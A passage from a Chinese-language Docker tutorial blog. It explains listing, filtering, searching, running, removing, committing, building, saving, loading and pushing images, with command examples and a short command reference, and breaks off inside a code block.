<code>--no-trunc</code> 选项，如下面命令：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">history</span> --<span class="keyword">no</span>-<span class="built_in">trunc</span> mysq<span class="variable">l:5</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure><p><strong>虚悬镜像</strong></p><p>上面的镜像列表中，还可以看到一个特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 <code>&lt;none&gt;</code>：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;none&gt;               &lt;none&gt;              <span class="number">00285</span>df0df87        <span class="number">5</span> days ago          <span class="number">342</span> MB</span><br></pre></td></tr></table></figure><p>这个镜像原本是有镜像名和标签的，原来为 <code>mongo:3.2</code>，随着官方镜像维护，发布了新版本后，重新 <code>docker pull mongo:3.2</code> 时，mongo:3.2 这个镜像名被转移到了新下载的镜像身上，而旧的镜像上的这个名称则被取消，从而成为了 <code>&lt;none&gt;</code>。除了 <code>docker pull</code> 可能导致这种情况，<code>docker build</code> 也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为 <code>&lt;none&gt;</code> 的镜像。这类无标签镜像也被称为 <strong>虚悬镜像(dangling image)</strong> ，可以用下面的命令专门显示这类镜像：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -f <span class="attr">dangling=</span><span class="literal">true</span></span><br><span class="line">REPOSITORY          <span class="keyword">TAG</span>                 <span class="title">IMAGE</span> ID            CREATED             SIZE</span><br><span class="line"><span class="tag">&lt;none&gt;</span>              <span class="tag">&lt;none&gt;</span>              <span class="number">00285</span>df0df87        <span class="number">5</span> days ago          <span class="number">342</span> MB</span><br></pre></td></tr></table></figure><p>一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image prune</span></span><br></pre></td></tr></table></figure><p><strong>中间层镜像</strong></p><p>为了加速镜像构建、重复利用资源，Docker 会利用 <strong>中间层镜像</strong>。所以在使用一段时间后，可能会看到一些<strong>依赖</strong>的中间层镜像。默认的 <code>docker image ls</code> 列表中只会显示顶层镜像，如果希望显示包括中间层镜像在内的所有镜像的话，需要加 <code>-a</code> 参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image ls -a</span></span><br></pre></td></tr></table></figure><p><strong>列出部分镜像</strong></p><p>不加任何参数的情况下，docker image ls 会列出所有顶层镜像，但是有时候我们只希望列出部分镜像。docker image ls 有好几个参数可以帮助做到这个事情。</p><p>根据仓库名列出镜像</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls ubuntu</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              <span class="number">18.04</span>               f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br><span class="line">ubuntu              latest              f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br></pre></td></tr></table></figure><p>列出特定的某个镜像，也就是说指定仓库名和标签</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls ubuntu:18.04</span><br><span class="line">REPOSITORY          TAG                 <span class="built_in">IMAGE</span> ID            CREATED             <span class="built_in">SIZE</span></span><br><span class="line">ubuntu              <span class="number">18.04</span>               f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br></pre></td></tr></table></figure><p>除此以外，docker image ls 还支持强大的过滤器参数 –filter，或者简写 -f。之前我们已经看到了使用过滤器来列出虚悬镜像的用法，它还有更多的用法。比如，我们希望看到在 mongo:3.2 之后建立的镜像，可以用下面的命令：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -f since=mongo:3.2</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">redis               latest              5f515359c7f8       <span class="number"> 5 </span>days ago         <span class="number"> 183 </span>MB</span><br><span class="line">nginx               latest              05a60462f8ba       <span class="number"> 5 </span>days ago         <span class="number"> 181 </span>MB</span><br></pre></td></tr></table></figure><p>想查看某个位置之前的镜像也可以，只需要把 since 换成 before 即可。</p><p>此外，如果镜像构建时，定义了 LABEL，还可以通过 LABEL 来过滤。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker image <span class="keyword">ls</span> -f label=com.example.<span class="keyword">version</span>=0.1</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p><strong>以特定格式显示</strong></p><p>默认情况下，docker image ls 会输出一个完整的表格，但是我们并非所有时候都会需要这些内容。比如，刚才删除虚悬镜像的时候，我们需要利用 <code>docker image ls</code> 把所有的虚悬镜像的 ID 列出来，然后才可以交给 <code>docker image rm</code> 命令作为参数来删除指定的这些镜像，这个时候就用到了 <code>-q</code> 参数。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -q</span><br><span class="line"><span class="number">5</span>f<span class="number">515359</span><span class="keyword">c</span><span class="number">7</span>f<span class="number">8</span></span><br><span class="line"><span class="number">05</span>a<span class="number">60462</span>f<span class="number">8</span>ba</span><br><span class="line">fe<span class="number">9198</span><span class="keyword">c</span><span class="number">04</span>d<span class="number">62</span></span><br><span class="line"><span class="number">00285</span>df<span class="number">0</span>df<span class="number">87</span></span><br><span class="line">f<span class="number">753707788</span><span class="keyword">c</span><span class="number">5</span></span><br><span class="line">f<span class="number">753707788</span><span class="keyword">c</span><span class="number">5</span></span><br><span class="line"><span class="number">1e0</span><span class="keyword">c</span><span class="number">3</span>dd<span class="number">64</span>ccd</span><br></pre></td></tr></table></figure><h3 id="Docker-搜索镜像"><a href="#Docker-搜索镜像" class="headerlink" title="Docker 搜索镜像"></a>Docker 搜索镜像</h3><p><strong>search 命令</strong></p><p>您可以通过下面命令进行搜索：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search <span class="string">[option]</span> keyword</span><br></pre></td></tr></table></figure><p>比如，您想搜索仓库中 <code>mysql</code> 相关的镜像，可以输入如下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search mysql</span></span><br></pre></td></tr></table></figure><p><strong>search 子命令</strong></p><p>命令行输入 <code>docker search--help</code>, 输出如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage:  docker <span class="built_in">search</span> [OPTIONS] TERM</span><br><span class="line">Search the Docker Hub <span class="keyword">for</span> images</span><br><span class="line">Option<span class="variable">s:</span>  -<span class="keyword">f</span>, --<span class="built_in">filter</span> <span class="built_in">filter</span>   Filter output based <span class="keyword">on</span> conditions provided      --<span class="keyword">help</span>            <span class="keyword">Print</span> usage      --limit <span class="keyword">int</span>       Max <span class="keyword">number</span> of <span class="built_in">search</span> results (default <span class="number">25</span>)      --<span class="keyword">no</span>-<span class="built_in">index</span>        Don<span class="string">'t truncate output      --no-trunc        Don'</span>t truncate output</span><br></pre></td></tr></table></figure><p>可以看到 <code>search</code> 支持的子命令有：</p><ul><li><code>-f,--filter filter</code>: 过滤输出的内容；</li><li><code>--limitint</code>：指定搜索内容展示个数;</li><li><code>--no-index</code>: 不截断输出内容；</li><li><code>--no-trunc</code>：不截断输出内容；</li></ul><p>举个列子，比如我们想搜索官方提供的 mysql 镜像，命令如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search --<span class="built_in">filter</span>=<span class="keyword">is</span>-offical=<span class="literal">true</span> mysql</span><br></pre></td></tr></table></figure><p>再比如，我们想搜索 Stars 数超过 100 的 mysql 镜像：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search <span class="attribute">--filter</span>=stars=100 mysql</span><br></pre></td></tr></table></figure><h3 id="Docker-运行镜像"><a href="#Docker-运行镜像" class="headerlink" title="Docker 运行镜像"></a>Docker 运行镜像</h3><p>有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。以上面的 <code>ubuntu:18.04</code> 为例，如果我们打算启动里面的 bash 并且进行交互式操作的话，可以执行下面的命令。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --rm ubuntu:18.04 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="section">root@e7009c6ce357:/# cat /etc/os-release</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"18.04.1 LTS (Bionic Beaver)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 18.04.1 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"18.04"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br></pre></td></tr></table></figure><ul><li>-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li>–rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。</li><li>ubuntu:18.04：这是指用 ubuntu:18.04 镜像为基础来启动容器。</li><li>bash：放在镜像名后的是 命令，这里我们希望有个交互式 Shell，因此用的是 bash。</li></ul><p>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 cat /etc/os-release，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 Ubuntu 18.04.1 LTS 系统。</p><p>最后我们通过 exit 退出了这个容器。</p><h3 id="Docker-删除镜像"><a href="#Docker-删除镜像" class="headerlink" title="Docker 删除镜像"></a>Docker 删除镜像</h3><p><strong>通过标签删除镜像</strong></p><p>通过如下两个都可以删除镜像：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi <span class="string">[image]</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">image</span> rm [<span class="built_in">image</span>]</span><br></pre></td></tr></table></figure><p>支持的子命令如下：</p><ul><li><code>-f,-force</code>: 强制删除镜像，即便有容器引用该镜像；</li><li><code>-no-prune</code>: 不要删除未带标签的父镜像；</li></ul><p>例如，我们想删除上章节创建的 <code>qymua_mysql:5.7</code> 镜像，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi qymua_mysql:5.7</span><br></pre></td></tr></table></figure><p><strong>实际上，当同一个镜像拥有多个标签时，执行 <code>docker rmi</code> 命令，只是会删除了该镜像众多标签中，您指定的标签而已，并不会影响原始的那个镜像文件。</strong></p><p>那么，如果某个镜像不存在多个标签，当且仅当只有一个标签时，执行删除命令时，您就要小心了，这会彻底删除镜像。</p><p><strong>通过 ID 删除镜像</strong></p><p>除了通过标签名称来删除镜像，我们还可以通过制定镜像 ID, 来删除镜像，如：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi ee7cbd482336</span><br></pre></td></tr></table></figure><p>一旦制定了通过 ID 来删除镜像，它会先尝试删除所有指向该镜像的标签，然后在删除镜像本身。</p><p><strong>删除镜像的限制</strong></p><p>删除镜像很简单，但也不是我们何时何地都能删除的，它存在一些限制条件。</p><p>当通过该镜像创建的容器未被销毁时，镜像是无法被删除的。</p><p>除非通过添加 <code>-f</code> 子命令，也就是强制删除，才能移除掉该镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">rmi</span> <span class="selector-tag">-f</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p>但是，一般不推荐这样暴力的做法，正确的做法应该是：</p><ol><li>先删除引用这个镜像的容器；</li><li>再删除这个镜像；</li></ol><p>也就是，根据引用该镜像的容器 ID ( <code>9d59e2278553</code>), 执行删除命令：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm <span class="number">9d</span><span class="number">59e2278553</span></span><br></pre></td></tr></table></figure><p>然后，再执行删除镜像的命令：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi <span class="number">5</span>cb3aa00f899</span><br></pre></td></tr></table></figure><p><strong>清理镜像</strong></p><p>我们在使用 Docker 一段时间后，系统一般都会残存一些临时的、没有被使用的镜像文件，可以通过以下命令进行清理：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">image</span> prune</span><br></pre></td></tr></table></figure><p>它支持的子命令有：</p><ul><li><code>-a,--all</code>: 删除所有没有用的镜像，而不仅仅是临时文件；</li><li><code>-f,--force</code>：强制删除镜像文件，无需弹出提示确认；</li></ul><h3 id="Docker-创建镜像"><a href="#Docker-创建镜像" class="headerlink" title="Docker 创建镜像"></a>Docker 创建镜像</h3><p>Docker 创建镜像主要有三种：</p><ol><li>基于已有的镜像创建；</li><li>基于 Dockerfile 来创建；</li><li>基于本地模板来导入；</li></ol><p>我们将主要介绍常用的 1，2 两种。</p><p><strong>基于已有的镜像创建</strong></p><p>通过如下命令来创建：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> commit</span><br></pre></td></tr></table></figure><p>支持的子命令如下：</p><ul><li><code>-a,--author</code>=””: 作者信息；</li><li><code>-c,--change</code>=[]: 可以在提交的时候执行 Dockerfile 指令，如 CMD、ENTRYPOINT、ENV、EXPOSE、LABEL、ONBUILD、USER、VOLUME、WORIR 等；</li><li><code>-m,--message</code>=””: 提交信息；</li><li><code>-p,--pause</code>=true: 提交时，暂停容器运行。</li></ul><p>接下来，基于本地已有的 Ubuntu 镜像，创建一个新的镜像：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566222657046.png" alt></p><p>首先，让我将它运行起来，并在其中创建一个 test.txt 文件：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566222903594.png" alt></p><p>命令如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntuweb</span><span class="symbol">:/</span><span class="comment"># docker run -it ubuntu:latest /bin/bash</span></span><br><span class="line">root<span class="variable">@437b2645a468</span><span class="symbol">:/</span><span class="comment"># touch test.txt</span></span><br><span class="line">root<span class="variable">@437b2645a468</span><span class="symbol">:/</span><span class="comment"># exit</span></span><br></pre></td></tr></table></figure><p>创建完 test.txt 文件后，需要记住标注的容器 ID: <code>a0a0c8cfec3a</code>, 用它来提交一个新的镜像(<strong>PS: 你也可以通过名称来提交镜像，这里只演示通过 ID 的方式</strong>)。</p><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="keyword">commit</span> -m <span class="string">"Added test.txt file"</span> -a <span class="string">"QYMUA"</span> <span class="number">437</span>b2645a468 <span class="keyword">test</span>:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>提交成功后，会返回新创建的镜像 ID 信息，如下图所示：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223141324.png" alt></p><p>再次查看本地镜像信息，可以看到新创建的 <code>test:0.1</code> 镜像了：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223162903.png" alt></p><p><strong>基于 Dockerfile 创建</strong></p><p>通过 Dockerfile 的方式来创建镜像，是最常见的一种方式了，也是比较推荐的方式。Dockerfile 是一个文本指令文件，它描述了是如何基于一个父镜像，来创建一个新镜像的过程。</p><p>下面让我们来编写一个简单的 Dockerfile 文件，它描述了基于 Ubuntu 父镜像，安装 Python3 环境的镜像：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest</span><br><span class="line">LABEL <span class="attribute">version</span>=<span class="string">"1.0"</span> <span class="attribute">maintainer</span>=<span class="string">"QYMUA &lt;Qymua@github&gt;"</span></span><br><span class="line"><span class="builtin-name">RUN</span> apt-<span class="builtin-name">get</span> update &amp;&amp; \    apt-<span class="builtin-name">get</span> install -y python3 &amp;&amp; \    apt-<span class="builtin-name">get</span> clean &amp;&amp; \    rm -rf /var/lib/apt/lists/*</span><br></pre></td></tr></table></figure><p>创建完成后，通过这个 Dockerfile 文件，来构建新的镜像，执行命令：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">image</span> build -t <span class="keyword">python</span>:<span class="number">3</span> .</span><br></pre></td></tr></table></figure><p><strong>注意：</strong> 命令的最后有个点，如果不加的话，会构建不成功 </p><h3 id="Docker-导出-amp-加载镜像"><a href="#Docker-导出-amp-加载镜像" class="headerlink" title="Docker 导出&amp;加载镜像"></a>Docker 导出&amp;加载镜像</h3><p>通常我们会有下面这种需求，需要将镜像分享给别人，这个时候，我们可以将镜像导出成 tar 包，别人直接通过加载这个 tar 包，快速地将镜像引入到本地镜像库。</p><p>要想使用这两个功能，主要是通过如下两个命令：</p><ol><li><code>docker save</code></li><li><code>docker load</code></li></ol><p><strong>导出镜像</strong></p><p>例如，我们想要将 test:0.1 镜像导出来，执行命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">save</span> <span class="selector-tag">-o</span> <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span> <span class="selector-tag">test</span><span class="selector-pseudo">:0.1</span></span><br></pre></td></tr></table></figure><p>执行成功后，查看当前目录：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223683239.png" alt></p><p>可以看到 <code>test_0.1.tar</code> 镜像文件已经生成</p><p><strong>加载镜像</strong></p><p>别人拿到了这个 <code>tar</code> 包后，要如何导入到本地的镜像库呢？</p><p>通过执行如下命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">load</span> <span class="selector-tag">-i</span> <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">load</span> &lt; <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure><p>导入成功后，查看本地镜像信息，你就可以获得别人分享的镜像了！怎么样，是不是很方便呢！</p><h3 id="Docker-上传镜像"><a href="#Docker-上传镜像" class="headerlink" title="Docker 上传镜像"></a>Docker 上传镜像</h3><p>以上传到 Docker Hub 上为示例，演示 Docker 如何上传镜像。</p><p><strong>获取 Docker ID</strong></p><p>想要上传镜像到 Docker Hub 上，首先，我们需要注册 Docker Hub 账号。打开 Docker Hub 网址 <a href="https://hub.docker.com，开始注册：" target="_blank" rel="noopener">https://hub.docker.com，开始注册：</a></p><p>使用方法和github大致相同，创建仓库即可</p><p><strong>上传镜像</strong></p><p>进入命令行，<strong>用我们刚刚获取的 Docker ID 以及密码登录</strong>，执行命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker login</span></span><br></pre></td></tr></table></figure><p>命令行登录 Docker ID</p><p>登录成功后，我们开始准备上传本地的 镜像：</p><p>首先，我们对其打一个新的标签，<strong>前缀与我们新创建的 Docker ID 、仓库名保持一致</strong>:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">tag</span> <span class="title">test</span>:<span class="number">0.1</span> dockerID/test:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>查看本地信息，可以看到，标签打成功了。执行命令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">push</span> dockerID/<span class="keyword">test</span>:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><h2 id="操作Docker"><a href="#操作Docker" class="headerlink" title="操作Docker"></a>操作Docker</h2><h3 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566369005697.png" alt></p><p><strong>Search images</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker search ubuntu</span></span><br></pre></td></tr></table></figure><p>当我们需要拉取一个 docker 镜像，我们可以用如下命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull image_name</span><br></pre></td></tr></table></figure><p><code>image_name</code> 为镜像的名称，而如果我们想从 Docker Hub 上去下载某个镜像，我们可以使用以下命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">centos</span><span class="selector-pseudo">:latest</span></span><br></pre></td></tr></table></figure><p><code>centos:lastest</code> 是镜像的名称， Docker daemon 发现本地没有我们需要的镜像，会自动去 Docker Hub 上去下载镜像，下载完成后，该镜像被默认保存到 <code>/var/lib/docker</code> 目录下。</p><p>接着我们如果想查看下主机下存在多少镜像，我们可以用如下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>我们要想知道当前有哪些容器在运行，我们可以用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><code>-a</code> 是查看当前所有的容器，包括未运行的</p><p>我们该如何去对一个容器进行启动，重启和停止呢？我们可以用如下命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name/container_id</span><br><span class="line">docker restart container_name/container_id</span><br><span class="line">docker <span class="literal">stop</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>这个时候我们如果想进入到这个容器中，我们可以使用 attach 命令：</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">attach</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>利用dockerfile构建镜像：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t qymua/nginx_web:<span class="number">0</span>.<span class="number">1</span> .</span><br></pre></td></tr></table></figure><p>解释一下， -t 是为新镜像设置仓库和名称，其中 qymua 为仓库名， nginx_web 为镜像名， :0.1 为标签（不添加为默认 latest ）</p><p>那如果我们想运行这个容器中的镜像的话，并且调用镜像里面的 bash ，我们可以使用如下命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -<span class="selector-tag">i</span> container_name/container_id /bin/bash</span><br></pre></td></tr></table></figure><ul><li>docker run - 运行一个容器</li><li>-t - 分配一个（伪）tty (link is external)</li><li>-i - 交互模式 (so we can interact with it)</li><li>ubuntu:14.04 - 使用 ubuntu 基础镜像 14.04</li><li>/bin/bash - 运行命令 bash shell</li></ul><p>那如果这个时候，我们想删除指定镜像的话，由于 image 被某个 container 引用（拿来运行），如果不将这个引用的 container 销毁（删除），那 image 肯定是不能被删除。我们首先得先去停止这个容器：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">ps</span></span><br><span class="line">docker <span class="keyword">stop</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>然后我们用如下命令去删除这个容器：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">rm</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>然后这个时候我们再去删除这个镜像：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi image_name</span><br></pre></td></tr></table></figure><p>此时，常用的 Docker 相关的命令就讲到这里为止了，我们在后续的文章中还会反复地提到这些命令。</p><h3 id="Docker命令查询"><a href="#Docker命令查询" class="headerlink" title="Docker命令查询"></a>Docker命令查询</h3><p><strong>基本语法</strong></p><p>Docker 命令有两大类，客户端命令和服务端命令。前者是主要的操作接口，后者用来启动 Docker Daemon。</p><ul><li><p>客户端命令：基本命令格式为 docker [OPTIONS] COMMAND [arg…]；</p></li><li><p>服务端命令：基本命令格式为 dockerd [OPTIONS]。</p></li></ul><p>可以通过 man docker 或 docker help 来查看这些命令。</p><p><strong>客户端命令选项</strong></p><ul><li>–config=””：指定客户端配置文件，默认为 ~/.docker；</li><li>-D=true|false：是否使用 debug 模式。默认不开启；</li><li>-H, –host=[]：指定命令对应 Docker 守护进程的监听接口，可以为 unix 套接字 unix:///path/to/socket，文件句柄 fd://socketfd 或 tcp 套接字 tcp://[host[:port]]，默认为 unix:///var/run/docker.sock；</li><li>-l, –log-level=”debug|info|warn|error|fatal”：指定日志输出级别；</li><li>–tls=true|false：是否对 Docker 守护进程启用 TLS 安全机制，默认为否；</li><li>–tlscacert=/.docker/ca.pem：TLS CA 签名的可信证书文件路径；</li><li>–tlscert=/.docker/cert.pem：TLS 可信证书文件路径；</li><li>–tlscert=/.docker/key.pem：TLS 密钥文件路径；</li><li>–tlsverify=true|false：启用 TLS 校验，默认为否。</li></ul><p><strong>Docker命令帮助注释</strong></p><p>docker command</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 